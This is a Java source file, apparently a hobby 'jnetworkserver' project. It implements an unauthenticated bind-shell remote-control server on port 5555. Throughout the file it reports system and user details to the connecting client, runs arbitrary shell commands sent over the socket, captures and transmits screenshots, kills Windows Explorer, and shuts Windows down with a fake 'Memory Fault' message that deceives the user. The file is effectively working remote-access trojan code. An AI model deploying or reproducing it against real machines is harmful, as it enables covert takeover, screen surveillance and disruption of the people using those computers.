/*
 * Main.java
 *
 * Created on October 5, 2009, 10:26 PM
 
 */
package jnetworkserver;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;

/**
 *
 * @author Dhruv
 */
public class Main {

    static ServerSocket conn;
    static Socket Client;

    /**
     * Creates a new instance of Main
     */
    public Main() {
    }

    public static void main(String[] args) throws AWTException {
        try {
            conn = new ServerSocket(5555);
        } catch (IOException ex) {
        }
        try {
            Client = conn.accept();
        } catch (IOException ex) {
        }
        //JOptionPane.showMessageDialog(null,Client.getInetAddress());
        try {
            RecieveData();
        } catch (IOException ex) {
        }
    }

    static void RecieveData() throws IOException, AWTException {
        DataInputStream input;
        input = new DataInputStream(new BufferedInputStream(Client.getInputStream()));
        DataOutputStream w = new DataOutputStream(new BufferedOutputStream(Client.getOutputStream()));
        String s = null;
        StringBuffer line = new StringBuffer();
        Process p = null;
        int temp;
        File pwd = new File("/");
        w.writeBytes(System.getProperty("os.name") + "  " + System.getProperty("os.version") + "  " + System.getProperty("os.arch") + " " + System.getProperty("user.name") + " " + System.getProperty("user.home") + " " + System.getProperty("user.dir") + "\r\n");
        w.flush();
        while ((s = input.readLine()).compareToIgnoreCase("END") != 0) {


            if (s.indexOf("CHDIR") != -1) {
                pwd = new File(s.replaceAll("CHDIR ", "").trim());
                System.out.println("PWD : " + s);
            }
            else if(s.indexOf("WINSHUTDOWN")!=-1)
            {
                
                p = Runtime.getRuntime().exec("cmd /c shutdown -s -c \"Memory Fault. Terminating Windows\"");
            }
            else if(s.indexOf("WINKILLEXPLORER")!=-1)
            {
                
                p = Runtime.getRuntime().exec("cmd /c tskill explorer");
            }
            else if(s.indexOf("SCREENSHOT")!=-1)
            {
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                  BufferedImage capture = new Robot().createScreenCapture(screenRect);
              ImageIO.write(capture, "png", new File("screenshot.png"));
              FileInputStream f = new FileInputStream("screenshot.png");
              int scrntemp ; 
              int noOfBytes=0;
               while((scrntemp=f.read())!=-1)
              {
                  noOfBytes++;
              }
              f.close();
              f = new FileInputStream("screenshot.png");
               System.out.println(noOfBytes);
               w.writeBytes(noOfBytes+"\r\n");
             w.flush();
             scrntemp=0;
              for(int i=0;i<noOfBytes;i++)
              {
                  
                 scrntemp= f.read();
                 w.write(scrntemp);
                // System.out.println(scrntemp);
                 
               w.flush();
                 // System.out.println(scrntemp);
              }
              
               
               System.out.println("done");
            } 
            else {
                //SHELL

                s.trim();
                try {
                    if (System.getProperty("os.name").indexOf("Windows") != -1) {
                        p = Runtime.getRuntime().exec("cmd /c " + s, null, pwd);
                    } else {
                        p = Runtime.getRuntime().exec(s, null, pwd);
                    }


                    Thread.sleep(1000);
                    BufferedReader in = new BufferedReader(
                            new InputStreamReader(p.getInputStream()));

                    while ((temp = in.read()) != -1) {
                        line.append((char) temp);

                    }
                    w.writeBytes(line.toString() + "\r\n");
                    System.out.println("---Executing: " + s + "---");
                    System.out.println("Wrote:\n" + line);
                    System.out.println("---Execution Completed---");
                    w.writeBytes("END\r\n");
                    w.flush();
                    line.replace(0, line.length(), "");
                } catch (Exception e) {


                    w.writeBytes(e.getMessage() + "\r\n");
                    System.out.println("Wrote:" + e.getMessage());

                    w.writeBytes("END\r\n");
                    w.flush();
                }

            }


        }
    }
}
